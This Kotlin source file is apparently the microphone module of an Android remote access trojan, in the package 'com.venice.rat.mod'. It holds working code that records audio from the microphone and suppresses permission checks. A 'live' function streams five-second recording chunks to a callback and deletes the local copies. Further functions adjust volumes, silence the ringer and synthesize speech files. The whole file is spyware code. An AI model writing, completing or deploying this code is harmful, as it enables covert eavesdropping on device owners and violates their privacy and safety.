package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.speech.tts.TextToSpeech
import com.venice.rat.core.U
import kotlinx.coroutines.delay
import java.io.File
import java.util.Locale
import java.util.concurrent.CountDownLatch

@SuppressLint("MissingPermission")
object Mic {

    fun rec(ctx: Context, secs: Int, name: String = "m"): File? {
        val out = File(U.dir(ctx, "mic"), "${name}_${System.currentTimeMillis()}.m4a")
        val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
        return try {
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setAudioSamplingRate(44100)
            r.setAudioEncodingBitRate(96000)
            r.setOutputFile(out.absolutePath)
            r.prepare()
            r.start()
            Thread.sleep(secs.coerceIn(1, 600) * 1000L)
            r.stop()
            if (out.exists() && out.length() > 800) out else null
        } catch (e: Exception) {
            runCatching { r.stop() }
            null
        } finally {
            runCatching { r.release() }
        }
    }

    fun vol(ctx: Context): String {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val sb = StringBuilder()
        listOf("Ring" to AudioManager.STREAM_RING, "Media" to AudioManager.STREAM_MUSIC,
            "Alarm" to AudioManager.STREAM_ALARM).forEach { (n, s) ->
            sb.appendLine("$n: ${am.getStreamVolume(s)}/${am.getStreamMaxVolume(s)}")
        }
        return sb.toString()
    }

    fun setVol(ctx: Context, stream: Int, v: Int) {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        runCatching { am.setStreamVolume(stream, v.coerceIn(0, am.getStreamMaxVolume(stream)), 0) }
    }

    fun mute(ctx: Context, on: Boolean) {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        am.ringerMode = if (on) AudioManager.RINGER_MODE_SILENT else AudioManager.RINGER_MODE_NORMAL
    }

    fun tts(ctx: Context, text: String): File? {
        val out = File(U.dir(ctx, "tts"), "t_${System.currentTimeMillis()}.wav")
        val latch = CountDownLatch(1)
        var ok = false
        var t: TextToSpeech? = null
        t = TextToSpeech(ctx) { st ->
            if (st == TextToSpeech.SUCCESS) {
                t?.language = Locale.US
                t?.synthesizeToFile(text, null, out, "v")
                ok = true
            }
            latch.countDown()
        }
        latch.await()
        var n = 0
        while (n++ < 100 && (!out.exists() || out.length() < 500)) Thread.sleep(100)
        runCatching { t?.shutdown() }
        return if (ok && out.exists() && out.length() > 500) out else null
    }

    suspend fun live(ctx: Context, secs: Int, onChunk: suspend (File, Int) -> Unit) {
        var i = 0
        val end = System.currentTimeMillis() + secs * 1000L
        while (System.currentTimeMillis() < end) {
            val f = rec(ctx, 5, "l$i") ?: break
            i++
            onChunk(f, i)
            runCatching { f.delete() }
            delay(200)
        }
    }
}
